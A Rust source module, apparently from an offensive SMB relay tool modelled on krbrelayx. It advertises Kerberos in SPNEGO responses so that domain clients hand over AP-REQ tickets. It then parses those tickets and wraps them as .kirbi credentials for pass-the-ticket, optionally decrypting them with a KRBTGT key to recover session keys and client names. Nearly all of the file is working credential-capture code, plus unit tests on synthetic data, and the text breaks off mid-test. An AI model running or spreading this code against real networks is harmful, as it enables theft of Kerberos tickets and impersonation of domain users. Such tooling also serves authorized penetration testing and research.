//! Kerberos AP-REQ capture on the SMB2 listener (krbrelayx parity).
//!
//! The daemon advertises the krb5 SASL mech (`1.2.840.113554.1.2.2`) in its
//! session-setup SPNEGO response; domain clients that hold a TGT switch from
//! NTLM to Kerberos and hand over an AP-REQ containing the ticket. The raw
//! ticket is extracted and re-wrapped as a `.kirbi` (KRB-CRED, app tag 22)
//! with a zeroed session-key placeholder -- valid for offline decryption and
//! pass-the-ticket once the KRBTGT / service key is recovered.
//!
//! With an optional KRBTGT key the captured enc-part is decrypted inline and
//! the emitted `.kirbi` becomes a complete pass-the-ticket credential
//! (session key + client principal included).

use crate::RelayError;
use serde::Serialize;

/// Full DER TLV of the Kerberos V5 SASL mech OID (1.2.840.113554.1.2.2)
pub const KRB5_MECH_OID_TLV: &[u8] = &[
    0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02,
];

/// Bare OID content bytes (without the 0x06 0x09 tag/length header)
const KRB5_MECH_OID_BARE: &[u8] = &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02];

/// AP-REQ msg-type
const MSG_TYPE_AP_REQ: u64 = 14;

/// Captured Kerberos ticket from an AP-REQ session setup leg.
#[derive(Debug, Clone, Serialize)]
pub struct CapturedKerberosTicket {
    /// Source IP of the client that presented the AP-REQ
    pub source: String,
    /// Raw security buffer as received (may include SPNEGO wrapper)
    pub apreq_raw: Vec<u8>,
    /// Raw Ticket TLV (`0x61` APPLICATION 1) extracted from the AP-REQ
    pub ticket_blob: Vec<u8>,
    /// Ticket realm
    pub realm: String,
    /// Ticket service principal components
    pub sname: Vec<String>,
    /// Service principal name-type (NT_PRINCIPAL=1, NT_SRV_INST=2, ...)
    pub name_type: i32,
    /// enc-part encryption type (23 = RC4, 17 = AES128, 18 = AES256)
    pub etype: i32,
    /// enc-part key version number
    pub kvno: u32,
    /// Cipher bytes of the ticket enc-part
    pub cipher: Vec<u8>,
    /// `.kirbi` (KRB-CRED) with zeroed session-key placeholder
    pub kirbi: Vec<u8>,
}

/// Session key + client identity recovered by decrypting the ticket enc-part
#[derive(Debug, Clone, Serialize)]
pub struct DecryptedTicket {
    pub session_key: Vec<u8>,
    pub session_key_etype: i32,
    pub crealm: String,
    pub cname: Vec<String>,
    /// Ticket flags from the decrypted enc-part
    pub flags: u32,
}

/// A fully-populated `.kirbi`: ticket + session key + principals.
#[derive(Debug, Clone, Serialize)]
pub struct CompleteKirbi {
    pub kirbi: Vec<u8>,
    pub client_realm: String,
    pub client_name: Vec<String>,
    pub session_key_hex: String,
    pub session_key_etype: i32,
    pub service_realm: String,
    pub service_name: Vec<String>,
    pub is_tgt: bool,
}

// ===========================================================
// SPNEGO helpers
// ===========================================================

/// True when the SPNEGO blob (negTokenInit or response) advertises the
/// Kerberos V5 mech.
pub fn is_kerberos_offering(spnego: &[u8]) -> bool {
    find(spnego, KRB5_MECH_OID_BARE).is_some()
}

/// Build the session-setup SPNEGO response that steers a client to Kerberos:
/// negState = accept-incomplete, supportedMech = krb5, empty responseToken.
/// The client answers with an AP-REQ in the next session-setup leg.
pub fn build_krb5_spnego_challenge() -> Vec<u8> {
    // negTokenResp contents:
    //   A0 03 0A 01 01          negState accept-incomplete
    //   A1 <krb5 OID TLV>       supportedMech
    //   A2 04 00                responseToken (empty)
    let inner = [
        vec![0xA0, 0x03, 0x0A, 0x01, 0x01],
        vec![0xA1, KRB5_MECH_OID_TLV.len() as u8],
        KRB5_MECH_OID_TLV.to_vec(),
        vec![0xA2, 0x04, 0x04, 0x00],
    ]
    .concat();
    let seq = tlv(0x30, &inner);
    tlv(0xA1, &seq)
}

/// Parse an AP-REQ out of a security buffer. Handles both a bare
/// APPLICATION 14 TLV and SPNEGO-wrapped blobs (skips leading noise).
pub fn parse_ap_req(data: &[u8]) -> Result<ApReq, RelayError> {
    if data.len() < 10 {
        return Err(RelayError::Protocol("AP-REQ too short".into()));
    }
    // Scan for the APPLICATION 14 tag within the first 256 bytes (SPNEGO
    // wrappers add ~20 bytes of header before the AP-REQ).
    let scan_end = data.len().min(256);
    for start in 0..scan_end {
        if data[start] != 0x6E {
            continue;
        }
        if let Some(apreq) = try_parse_ap_req(&data[start..]) {
            return Ok(apreq);
        }
    }
    Err(RelayError::Protocol(
        "no parsable AP-REQ found in security buffer".into(),
    ))
}

#[derive(Debug, Clone, Serialize)]
pub struct ApReq {
    pub ap_options: u32,
    pub ticket: TicketInfo,
    /// Authenticator ciphertext (EncryptedData cipher)
    pub authenticator_cipher: Vec<u8>,
}

#[derive(Debug, Clone, Serialize)]
pub struct TicketInfo {
    pub ticket_blob: Vec<u8>,
    pub realm: String,
    pub sname: Vec<String>,
    pub name_type: i32,
    pub etype: i32,
    pub kvno: u32,
    pub cipher: Vec<u8>,
}

fn try_parse_ap_req(data: &[u8]) -> Option<ApReq> {
    // data[0] == 0x6E (APPLICATION 14)
    let (outer_len, outer_hdr) = read_tlv(data)?;
    let outer_end = outer_hdr + outer_len;
    if outer_end > data.len() || data.get(outer_hdr) != Some(&0x30) {
        return None;
    }

    // Inner SEQUENCE
    let (seq_len, seq_hdr) = read_tlv(&data[outer_hdr..outer_end])?;
    let seq_end = outer_hdr + seq_hdr + seq_len;
    if seq_end > outer_end {
        return None;
    }

    let mut pos = outer_hdr + seq_hdr;

    // pvno [0] INTEGER
    let (val, next) = read_int_ctx(data, pos, seq_end, 0xA0)?;
    if val != 5 {
        return None;
    }
    pos = next;

    // msg-type [1] INTEGER
    let (val, next) = read_int_ctx(data, pos, seq_end, 0xA1)?;
    if val != MSG_TYPE_AP_REQ {
        return None;
    }
    pos = next;

    // ap-options [2] BIT STRING
    let (ap_options, next) = read_bits_ctx(data, pos, seq_end, 0xA2)?;
    pos = next;

    // ticket [3] -- APPLICATION 1 (0x61)
    let (ttag, ticket_start, tlen) = read_ctx_tag(data, pos, seq_end)?;
    if ttag != 0xA3 {
        return None;
    }
    let ticket_end = ticket_start + tlen;
    if ticket_end > seq_end || data.get(ticket_start) != Some(&0x61) {
        return None;
    }
    let ticket = parse_ticket(&data[ticket_start..ticket_end])?;
    pos = ticket_end;

    // authenticator [4] -- EncryptedData (plain SEQUENCE, RFC 4120)
    let (atag, auth_start, alen) = read_ctx_tag(data, pos, seq_end)?;
    if atag != 0xA4 {
        return None;
    }
    let auth_end = auth_start + alen;
    if auth_end > seq_end || data.get(auth_start) != Some(&0x30) {
        return None;
    }
    let authenticator_cipher = parse_encrypted_data_cipher(data, auth_start, auth_end)?;

    Some(ApReq {
        ap_options,
        ticket,
        authenticator_cipher,
    })
}

/// Extract the cipher OCTET STRING from an EncryptedData SEQUENCE.
fn parse_encrypted_data_cipher(data: &[u8], seq_pos: usize, limit: usize) -> Option<Vec<u8>> {
    if data.get(seq_pos) != Some(&0x30) {
        return None;
    }
    let (seq_len, seq_hdr) = read_tlv(&data[seq_pos..limit])?;
    let seq_end = seq_pos + seq_hdr + seq_len;
    if seq_end > limit {
        return None;
    }
    let mut pos = seq_pos + seq_hdr;
    let mut cipher = Vec::new();
    while pos + 2 <= seq_end {
        let (tag, value_start, value_len) = read_ctx_tag(data, pos, seq_end)?;
        if tag == 0xA2 {
            let (v, _) = read_octets(data, value_start, seq_end)?;
            cipher = v;
        }
        pos = value_start + value_len;
    }
    if cipher.is_empty() {
        None
    } else {
        Some(cipher)
    }
}

/// Parse an APPLICATION 1 (0x61) Ticket TLV.
fn parse_ticket(data: &[u8]) -> Option<TicketInfo> {
    if data.first() != Some(&0x61) {
        return None;
    }
    let (outer_len, outer_hdr) = read_tlv(data)?;
    let outer_end = outer_hdr + outer_len;
    if outer_end > data.len() {
        return None;
    }
    let ticket_blob = data[..outer_end].to_vec();
    if data.get(outer_hdr) != Some(&0x30) {
        return None;
    }
    let (seq_len, seq_hdr) = read_tlv(&data[outer_hdr..outer_end])?;
    let seq_end = outer_hdr + seq_hdr + seq_len;
    if seq_end > outer_end {
        return None;
    }

    let mut realm = String::new();
    let mut sname: Vec<String> = Vec::new();
    let mut name_type: i32 = 1;
    let mut etype: i32 = 0;
    let mut kvno: u32 = 0;
    let mut cipher: Vec<u8> = Vec::new();

    let mut pos = outer_hdr + seq_hdr;
    while pos + 2 <= seq_end {
        let (tag, value_start, value_len) = read_ctx_tag(data, pos, seq_end)?;
        match tag {
            0xA0 => {
                // tkt-vno -- skip
            }
            0xA1 => {
                realm = read_general_string(data, value_start, seq_end)?;
            }
            0xA2 => {
                let (nt, names) = parse_principal_name(data, value_start, seq_end)?;
                name_type = nt;
                sname = names;
            }
            0xA3 => {
                let (et, kv, c) = parse_encrypted_data(data, value_start, seq_end)?;
                etype = et;
                kvno = kv;
                cipher = c;
            }
            _ => {}
        }
        pos = value_start + value_len;
    }

    if realm.is_empty() || sname.is_empty() || cipher.is_empty() {
        return None;
    }

    Some(TicketInfo {
        ticket_blob,
        realm,
        sname,
        name_type,
        etype,
        kvno,
        cipher,
    })
}

/// Parse a PrincipalName SEQUENCE (starting at the 0x30 tag): [0] INTEGER
/// name-type and [1] SEQUENCE OF GeneralString.
fn parse_principal_name(data: &[u8], seq_pos: usize, limit: usize) -> Option<(i32, Vec<String>)> {
    if data.get(seq_pos) != Some(&0x30) {
        return None;
    }
    let (seq_len, seq_hdr) = read_tlv(&data[seq_pos..limit])?;
    let seq_end = seq_pos + seq_hdr + seq_len;
    if seq_end > limit {
        return None;
    }

    let mut name_type: i32 = 1;
    let mut names: Vec<String> = Vec::new();

    let mut pos = seq_pos + seq_hdr;
    while pos + 2 <= seq_end {
        let (tag, value_start, value_len) = read_ctx_tag(data, pos, seq_end)?;
        match tag {
            0xA0 => {
                let (v, _) = read_int(data, value_start, seq_end)?;
                name_type = v as i32;
            }
            0xA1 => {
                // [1] wraps a SEQUENCE OF GeneralString
                if data.get(value_start) != Some(&0x30) {
                    return None;
                }
                let (list_len, list_hdr) = read_tlv(&data[value_start..seq_end])?;
                let list_end = value_start + list_hdr + list_len;
                if list_end > seq_end {
                    return None;
                }
                let mut sp = value_start + list_hdr;
                while sp + 2 <= list_end {
                    let s = read_general_string(data, sp, list_end)?;
                    names.push(s);
                    let (sl, sh) = read_tlv(&data[sp..list_end])?;
                    sp += sh + sl;
                }
            }
            _ => {}
        }
        pos = value_start + value_len;
    }

    if names.is_empty() {
        return None;
    }
    Some((name_type, names))
}

/// Parse EncryptedData SEQUENCE (starting at the 0x30 tag): [0] etype,
/// [1] kvno (optional), [2] cipher.
fn parse_encrypted_data(data: &[u8], seq_pos: usize, limit: usize) -> Option<(i32, u32, Vec<u8>)> {
    if data.get(seq_pos) != Some(&0x30) {
        return None;
    }
    let (seq_len, seq_hdr) = read_tlv(&data[seq_pos..limit])?;
    let seq_end = seq_pos + seq_hdr + seq_len;
    if seq_end > limit {
        return None;
    }

    let mut etype: i32 = 0;
    let mut kvno: u32 = 0;
    let mut cipher: Vec<u8> = Vec::new();

    let mut pos = seq_pos + seq_hdr;
    while pos + 2 <= seq_end {
        let (tag, value_start, value_len) = read_ctx_tag(data, pos, seq_end)?;
        match tag {
            0xA0 => {
                let (v, _) = read_int(data, value_start, seq_end)?;
                etype = v as i32;
            }
            0xA1 => {
                let (v, _) = read_int(data, value_start, seq_end)?;
                kvno = v as u32;
            }
            0xA2 => {
                let (v, _) = read_octets(data, value_start, seq_end)?;
                cipher = v;
            }
            _ => {}
        }
        pos = value_start + value_len;
    }

    if cipher.is_empty() {
        return None;
    }
    Some((etype, kvno, cipher))
}

// ===========================================================
// KRB-CRED (.kirbi) builder
// ===========================================================

/// Build a KRB-CRED (.kirbi) around a captured ticket.
///
/// `session_key`/`session_key_etype`: when known (decrypted offline), embed
/// the real key; otherwise a zeroed 16-byte placeholder with etype 0 is
/// written, matching krbrelayx's capture output.
#[allow(clippy::too_many_arguments)]
pub fn build_kirbi(
    ticket_blob: &[u8],
    srealm: &str,
    sname: &[String],
    name_type: i32,
    client_realm: Option<&str>,
    client_name: &[String],
    session_key: Option<&[u8]>,
    session_key_etype: i32,
) -> Vec<u8> {
    // ---- KrbCredInfo ----
    let key = session_key.unwrap_or(&[0u8; 16]).to_vec();
    let key_seq = tlv(
        0x30,
        &[
            tlv(0xA0, &int_der(session_key_etype as i64)),
            tlv(0xA1, &octets_der(&key)),
        ]
        .concat(),
    );
    let key_field = tlv(0xA0, &key_seq);

    let mut info_body = vec![key_field];
    if let Some(cr) = client_realm {
        info_body.push(tlv(0xA1, &general_string(cr)));
    }
    if !client_name.is_empty() {
        info_body.push(tlv(0xA2, &principal_name_der(name_type, client_name)));
    }
    info_body.push(tlv(0xA8, &general_string(srealm)));
    info_body.push(tlv(0xA9, &principal_name_der(name_type, sname)));

    let info = tlv(0x30, &info_body.concat());
    let enc_krb_cred = tlv(0x30, &tlv(0xA0, &info));

    // ---- EncryptedData (plaintext convention, etype 0) ----
    let enc_part = tlv(
        0xA3,
        &tlv(
            0x30,
            &[
                tlv(0xA0, &int_der(0)),
                tlv(0xA2, &octets_der(&enc_krb_cred)),
            ]
            .concat(),
        ),
    );

    // ---- KRB-CRED outer ----
    let body = [
        tlv(0xA0, &int_der(5)),             // pvno
        tlv(0xA1, &int_der(22)),            // msg-type KRB-CRED
        tlv(0xA2, &tlv(0x30, ticket_blob)), // tickets SEQUENCE OF Ticket
        enc_part,
    ]
    .concat();
    tlv(0x76, &body)
}

/// Wrap a captured ticket into a `CompleteKirbi` using a decryption key
/// (KRBTGT or service key). Returns None when the key/etype cannot decrypt
/// the enc-part.
pub fn decrypt_ticket(ticket: &TicketInfo, key: &[u8]) -> Option<CompleteKirbi> {
    let cipher = kerberos_crypto::new_kerberos_cipher(ticket.etype).ok()?;
    // Key usage 2 = AP-REQ ticket; decrypt(key, usage, ciphertext)
    let plain = cipher.decrypt(key, 2, &ticket.cipher).ok()?;
    let dec = parse_enc_ticket_part(&plain)?;
    let kirbi = build_kirbi(
        &ticket.ticket_blob,
        &ticket.realm,
        &ticket.sname,
        ticket.name_type,
        Some(&dec.crealm),
        &dec.cname,
        Some(&dec.session_key),
        dec.session_key_etype,
    );
    let service_name = ticket.sname.clone();
    // A TGT is a ticket to service krbtgt with the client name as realm
    // component; krbrelayx marks tickets whose sname[0] == "krbtgt".
    let is_tgt = ticket
        .sname
        .first()
        .map(|s| s.eq_ignore_ascii_case("krbtgt"))
        .unwrap_or(false);

    Some(CompleteKirbi {
        kirbi,
        client_realm: dec.crealm.clone(),
        client_name: dec.cname.clone(),
        session_key_hex: hex::encode(&dec.session_key),
        session_key_etype: dec.session_key_etype,
        service_realm: ticket.realm.clone(),
        service_name,
        is_tgt,
    })
}

/// Parse a decrypted EncTicketPart (APPLICATION 3 SEQUENCE): flags, key,
/// crealm, cname.
fn parse_enc_ticket_part(plain: &[u8]) -> Option<DecryptedTicket> {
    if plain.len() < 10 {
        return None;
    }
    // The plaintext either starts with the APPLICATION 3 tag (0x6D) wrapping
    // the inner SEQUENCE, or is a bare SEQUENCE.
    let fields_start = if plain[0] == 0x6D {
        let (_, hdr) = read_tlv(plain)?;
        if plain.get(hdr) != Some(&0x30) {
            return None;
        }
        let (_, seq_hdr) = read_tlv(&plain[hdr..])?;
        hdr + seq_hdr
    } else if plain[0] == 0x30 {
        let (_, seq_hdr) = read_tlv(plain)?;
        seq_hdr
    } else {
        return None;
    };
    let end = plain.len();

    let mut flags: u32 = 0;
    let mut session_key: Vec<u8> = Vec::new();
    let mut session_key_etype: i32 = 0;
    let mut crealm = String::new();
    let mut cname: Vec<String> = Vec::new();

    let mut pos = fields_start;
    while pos + 2 <= end {
        let (tag, value_start, value_len) = read_ctx_tag(plain, pos, end)?;
        match tag {
            0xA0 => {
                // TicketFlags BIT STRING
                let (bits, _) = read_bits(plain, value_start, end)?;
                flags = bits;
            }
            0xA1 => {
                // EncryptionKey SEQUENCE { [0] etype, [1] key }
                if plain.get(value_start) != Some(&0x30) {
                    return None;
                }
                let (s_len, s_hdr) = read_tlv(&plain[value_start..end])?;
                let s_end = value_start + s_hdr + s_len;
                if s_end > end {
                    return None;
                }
                let mut ip = value_start + s_hdr;
                while ip + 2 <= s_end {
                    let (it, iv, ilen) = read_ctx_tag(plain, ip, s_end)?;
                    match it {
                        0xA0 => {
                            let (v, _) = read_int(plain, iv, s_end)?;
                            session_key_etype = v as i32;
                        }
                        0xA1 => {
                            let (v, _) = read_octets(plain, iv, s_end)?;
                            session_key = v;
                        }
                        _ => {}
                    }
                    ip = iv + ilen;
                }
            }
            0xA2 => {
                crealm = read_general_string(plain, value_start, end)?;
            }
            0xA3 => {
                let (_, names) = parse_principal_name(plain, value_start, end)?;
                cname = names;
            }
            _ => {}
        }
        pos = value_start + value_len;
    }

    if session_key.is_empty() {
        return None;
    }

    Some(DecryptedTicket {
        session_key,
        session_key_etype,
        crealm,
        cname,
        flags,
    })
}

// ===========================================================
// DER primitives
// ===========================================================

/// Build a TLV with a single-byte or extended DER length.
pub(crate) fn tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    let len = content.len();
    if len < 128 {
        out.push(len as u8);
    } else if len < 256 {
        out.push(0x81);
        out.push(len as u8);
    } else if len < 65536 {
        out.push(0x82);
        out.push((len >> 8) as u8);
        out.push((len & 0xFF) as u8);
    } else {
        out.push(0x83);
        out.push((len >> 16) as u8);
        out.push((len >> 8) as u8);
        out.push((len & 0xFF) as u8);
    }
    out.extend_from_slice(content);
    out
}

fn int_der(v: i64) -> Vec<u8> {
    let content = if v == 0 {
        vec![0]
    } else if v > 0 {
        let be = v.to_be_bytes();
        let mut i = 0;
        while i < be.len() - 1 && be[i] == 0 {
            i += 1;
        }
        // add a leading 0 when the high bit is set (positive INTEGER)
        if be[i] & 0x80 != 0 {
            let mut c = vec![0u8];
            c.extend_from_slice(&be[i..]);
            c
        } else {
            be[i..].to_vec()
        }
    } else {
        v.to_be_bytes().to_vec()
    };
    tlv(0x02, &content)
}

fn octets_der(data: &[u8]) -> Vec<u8> {
    tlv(0x04, data)
}

fn general_string(s: &str) -> Vec<u8> {
    tlv(0x1B, s.as_bytes())
}

fn principal_name_der(name_type: i32, names: &[String]) -> Vec<u8> {
    let strings: Vec<u8> = names.iter().flat_map(|n| general_string(n)).collect();
    tlv(
        0x30,
        &[
            tlv(0xA0, &int_der(name_type as i64)),
            tlv(0xA1, &tlv(0x30, &strings)),
        ]
        .concat(),
    )
}

/// Read a TLV: returns (content_len, header_len). `data` starts at the tag.
fn read_tlv(data: &[u8]) -> Option<(usize, usize)> {
    if data.len() < 2 {
        return None;
    }
    let first = data[1] as usize;
    if first < 0x80 {
        Some((first, 2))
    } else {
        let nbytes = first & 0x7F;
        if nbytes == 0 || nbytes > 4 || data.len() < 2 + nbytes {
            return None;
        }
        let mut len = 0usize;
        for i in 0..nbytes {
            len = (len << 8) | data[2 + i] as usize;
        }
        Some((len, 2 + nbytes))
    }
}

/// Read a context-tag TLV at pos; returns (tag, content_start, content_len).
fn read_ctx_tag(data: &[u8], pos: usize, limit: usize) -> Option<(u8, usize, usize)> {
    if pos + 2 > limit {
        return None;
    }
    let tag = data[pos];
    let (len, header) = read_tlv(&data[pos..limit])?;
    if pos + header + len > limit {
        return None;
    }
    Some((tag, pos + header, len))
}

/// Read an INTEGER inside a context tag at pos; returns (value, next_pos).
fn read_int_ctx(data: &[u8], pos: usize, limit: usize, tag: u8) -> Option<(u64, usize)> {
    let (t, next, _) = read_ctx_tag(data, pos, limit)?;
    if t != tag {
        return None;
    }
    read_int(data, next, limit)
}

fn read_int(data: &[u8], pos: usize, limit: usize) -> Option<(u64, usize)> {
    if pos + 2 > limit {
        return None;
    }
    if data[pos] != 0x02 {
        return None;
    }
    let (len, header) = read_tlv(&data[pos..limit])?;
    let start = pos + header;
    if start + len > limit || len > 8 {
        return None;
    }
    let mut v: u64 = 0;
    for i in 0..len {
        v = (v << 8) | data[start + i] as u64;
    }
    Some((v, start + len))
}

/// Read a BIT STRING inside a context tag; returns (bits_u32, next_pos).
fn read_bits_ctx(data: &[u8], pos: usize, limit: usize, tag: u8) -> Option<(u32, usize)> {
    let (t, next, _) = read_ctx_tag(data, pos, limit)?;
    if t != tag {
        return None;
    }
    read_bits(data, next, limit)
}

fn read_bits(data: &[u8], pos: usize, limit: usize) -> Option<(u32, usize)> {
    if pos + 2 > limit {
        return None;
    }
    if data[pos] != 0x03 {
        return None;
    }
    let (len, header) = read_tlv(&data[pos..limit])?;
    let start = pos + header;
    if len == 0 || start + len > limit {
        return None;
    }
    let unused_bits = data[start] as usize;
    let mut bits: u32 = 0;
    for i in 1..len.min(5) {
        bits = (bits << 8) | data[start + i] as u32;
    }
    if unused_bits > 0 {
        bits >>= unused_bits;
    }
    Some((bits, start + len))
}

fn read_octets(data: &[u8], pos: usize, limit: usize) -> Option<(Vec<u8>, usize)> {
    if pos + 2 > limit {
        return None;
    }
    if data[pos] != 0x04 {
        return None;
    }
    let (len, header) = read_tlv(&data[pos..limit])?;
    let start = pos + header;
    if start + len > limit {
        return None;
    }
    Some((data[start..start + len].to_vec(), start + len))
}

fn read_general_string(data: &[u8], pos: usize, limit: usize) -> Option<String> {
    if pos + 2 > limit {
        return None;
    }
    if data[pos] != 0x1B {
        return None;
    }
    let (len, header) = read_tlv(&data[pos..limit])?;
    let start = pos + header;
    if start + len > limit {
        return None;
    }
    Some(String::from_utf8_lossy(&data[start..start + len]).to_string())
}

pub(crate) fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    (0..=haystack.len() - needle.len()).find(|&i| &haystack[i..i + needle.len()] == needle)
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
pub(crate) mod testutil {
    use super::*;

    /// Build a DER INTEGER wrapped in a context tag.
    pub fn t_int_ctx(tag: u8, v: u64) -> Vec<u8> {
        tlv(tag, &int_der(v as i64))
    }

    /// Build a synthetic AP-REQ with a realistic Ticket structure.
    #[allow(dead_code)]
    pub fn build_test_apreq() -> Vec<u8> {
        // -- Ticket (APPLICATION 1) --
        let cipher = vec![0xABu8; 100];
        let enc_part = tlv(
            0xA3,
            &tlv(
                0x30,
                &[
                    t_int_ctx(0xA0, 18), // etype AES256
                    t_int_ctx(0xA1, 2),  // kvno 2
                    tlv(0xA2, &octets_der(&cipher)),
                ]
                .concat(),
            ),
        );
        let sname = tlv(
            0xA2,
            &principal_name_der(2, &["cifs".to_string(), "dc.corp.local".to_string()]),
        );
        let realm = tlv(0xA1, &general_string("CORP.LOCAL"));
        let tkt_vno = t_int_ctx(0xA0, 5);
        let ticket_seq = tlv(0x30, &[tkt_vno, realm, sname, enc_part].concat());
        let ticket = tlv(0x61, &ticket_seq);

        // -- Authenticator [4] EncryptedData --
        // On the wire this is a plain EncryptedData SEQUENCE (etype [0],
        // cipher [2]); no APPLICATION tag wraps it.
        let auth_cipher = vec![0xCDu8; 40];
        let authenticator = tlv(
            0xA4,
            &tlv(
                0x30,
                &[
                    t_int_ctx(0xA0, 18), // etype AES256
                    tlv(0xA2, &octets_der(&auth_cipher)),
                ]
                .concat(),
            ),
        );

        // -- AP-REQ (APPLICATION 14) --
        // TicketFlags: 4 bytes little bit order; forwardable = 0x40000000
        let ap_options_bits = tlv(0xA2, &[0x03, 0x05, 0x00, 0x40, 0x00, 0x00, 0x00]);
        let body = tlv(
            0x30,
            &[
                t_int_ctx(0xA0, 5),
                t_int_ctx(0xA1, MSG_TYPE_AP_REQ),
                ap_options_bits,
                tlv(0xA3, &ticket),
                authenticator,
            ]
            .concat(),
        );
        tlv(0x6E, &body)
    }

    #[test]
    fn krb5_oid_detection() {
        let mut spnego = vec![0xA0, 0x20, 0x30, 0x1E, 0xA0, 0x1C];
        spnego.extend_from_slice(KRB5_MECH_OID_TLV);
        assert!(is_kerberos_offering(&spnego));
        assert!(!is_kerberos_offering(&[
            0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02
        ]));
        assert!(!is_kerberos_offering(&[]));
    }

    #[test]
    fn krb5_spnego_challenge_structure() {
        let resp = build_krb5_spnego_challenge();
        assert_eq!(resp[0], 0xA1);
        // negState accept-incomplete present
        assert!(find(&resp, &[0x0A, 0x01, 0x01]).is_some());
        // supportedMech = krb5 OID
        assert!(find(&resp, KRB5_MECH_OID_TLV).is_some());
        // empty responseToken
        assert!(find(&resp, &[0xA2, 0x04, 0x04, 0x00]).is_some());
    }

    #[test]
    fn parse_ap_req_extracts_ticket_fields() {
        let apreq = build_test_apreq();
        let parsed = parse_ap_req(&apreq).expect("parses");
        assert_eq!(parsed.ap_options & 0x4000_0000, 0x4000_0000);
        assert_eq!(parsed.ticket.realm, "CORP.LOCAL");
        assert_eq!(parsed.ticket.sname, vec!["cifs", "dc.corp.local"]);
        assert_eq!(parsed.ticket.name_type, 2);
        assert_eq!(parsed.ticket.etype, 18);
        assert_eq!(parsed.ticket.kvno, 2);
        assert_eq!(parsed.ticket.cipher.len(), 100);
        assert_eq!(parsed.authenticator_cipher.len(), 40);
        // ticket_blob starts at the 0x61 APPLICATION tag
        assert_eq!(parsed.ticket.ticket_blob[0], 0x61);
    }

    #[test]
    fn parse_ap_req_survives_spnego_wrapper() {
        let apreq = build_test_apreq();
        // Wrap in a fake SPNEGO negTokenResp (A1 30 A2 octet string)
        let token = tlv(0xA2, &octets_der(&apreq));
        let wrapped = tlv(0xA1, &tlv(0x30, &token));
        let parsed = parse_ap_req(&wrapped).expect("parses through wrapper");
        assert_eq!(parsed.ticket.realm, "CORP.LOCAL");
    }

    #[test]
    fn parse_ap_req_rejects_garbage() {
        assert!(parse_ap_req(&[]).is_err());
        assert!(parse_ap_req(&[0u8; 10]).is_err());
        assert!(parse_ap_req(b"NTLMSSP\x00\x03\x00\x00\x00").is_err());
        // AP-REQ with wrong msg-type
        let mut bad = build_test_apreq();
        let mid = bad.len() / 2;
        bad[mid] = 0x00;
        // may or may not parse depending on position; just must not panic
        let _ = parse_ap_req(&bad);
    }

    #[test]
    fn build_kirbi_roundtrip_structure() {
        let apreq = build_test_apreq();
        let parsed = parse_ap_req(&apreq).unwrap();
        let kirbi = build_kirbi(
            &parsed.ticket.ticket_blob,
            &parsed.ticket.realm,
            &parsed.ticket.sname,
            parsed.ticket.name_type,
            None,
            &[],
            None,
            0,
        );

        // KRB-CRED outer tag = APPLICATION 22 (0x76)
        assert_eq!(kirbi[0], 0x76);
        // pvno [0] INTEGER 5 and msg-type [1] INTEGER 22 present
        assert!(find(&kirbi, &[0xA0, 0x03, 0x02, 0x01, 0x05]).is_some());
        assert!(find(&kirbi, &[0xA1, 0x03, 0x02, 0x01, 0x16]).is_some());
        // the raw ticket blob is embedded verbatim
        assert!(find(&kirbi, &parsed.ticket.ticket_blob).is_some());
        // zeroed 16-byte session key placeholder present
        assert!(find(&kirbi, &[0u8; 16]).is_some());
        // srealm GeneralString present
        assert!(find(&kirbi, b"CORP.LOCAL").is_some());
        // service principal components present
        assert!(find(&kirbi, b"dc.corp.local").is_some());
    }

    #[test]
    fn build_kirbi_embeds_real_session_key() {
        let apreq = build_test_apreq();
        let parsed = parse_ap_req(&apreq).unwrap();
        let key = [0x42u8; 32];
        let kirbi = build_kirbi(
            &parsed.ticket.ticket_blob,
            &parsed.ticket.realm,
            &parsed.ticket.sname,
            parsed.ticket.name_type,
            Some("CORP.LOCAL"),
            &["alice".to_string()],
            Some(&key),
            18,
        );
        assert!(find(&kirbi, &key).is_some());
        assert!(find(&kirbi, b"alice").is_some());
    }

    #[test]
    fn tlv_length_encoding() {
        assert_eq!(tlv(0x30, &[1; 10])[1], 10);
        let medium = tlv(0x30, &[1; 200]);
        assert_eq!(&medium[1..3], &[0x81, 200]);
        let large = tlv(0x30, &[1; 1000]);
        assert_eq!(&large[1..4], &[0x82, 0x03, 0xE8]);
    }

    #[test]
    fn parse_ap_req_accepts_incomplete_trailing_junk_free_input() {
        // The parser must handle the exact TLV length, not run past it
        let apreq = build_test_apreq();
        let mut with_suffix = apreq.clone();
        with_suffix.extend_from_slice(b"garbage-after");
        let parsed = parse_ap_req(&with_suffix).expect("parses with suffix");
        assert_eq!(parsed.ticket.realm, "CORP.LOCAL");
    }

    /// Build an EncTicketPart (APPLICATION 3) the way a KDC would emit it.
    fn build_test_enc_ticket_part(session_key: &[u8]) -> Vec<u8> {
        let flags = tlv(0xA0, &[0x03, 0x05, 0x00, 0x40, 0x00, 0x00, 0x00]); // forwardable
        let key_field = tlv(
            0xA1,
            &tlv(
                0x30,
                &[
                    t_int_ctx(0xA0, 18), // AES256 session key
                    tlv(0xA1, &octets_der(session_key)),
                ]
                .concat(),
            ),
        );
        let crealm = tlv(0xA2, &general_string("CORP.LOCAL"));
        let cname = tlv(0xA3, &principal_name_der(1, &["alice".to_string()]));
        let seq = tlv(0x30, &[flags, key_field, crealm, cname].concat());
        tlv(0x6D, &seq)
    }

    #[test]
    fn decrypt_ticket_recovers_session_key_and_cname() {
        // Random AES256 KRBTGT-style key
        let krbtgt_key: Vec<u8> = (0..32).map(|_| rand::random::<u8>()).collect();
        let session_key: Vec<u8> = (0..32).map(|_| rand::random::<u8>()).collect();

        // Build the plaintext EncTicketPart and encrypt it (key usage 2)
        let enc_part = build_test_enc_ticket_part(&session_key);
        let cipher = kerberos_crypto::new_kerberos_cipher(18).unwrap();
        let encrypted = cipher.encrypt(&krbtgt_key, 2, &enc_part);

        // Embed into an AP-REQ ticket
        let ticket_cipher_blob = tlv(
            0xA3,
            &tlv(
                0x30,
                &[
                    t_int_ctx(0xA0, 18),
                    t_int_ctx(0xA1, 2), // kvno
                    tlv(0xA2, &octets_der(&encrypted)),
                ]
                .concat(),
            ),
        );
        let ticket_seq = tlv(
            0x30,
            &[
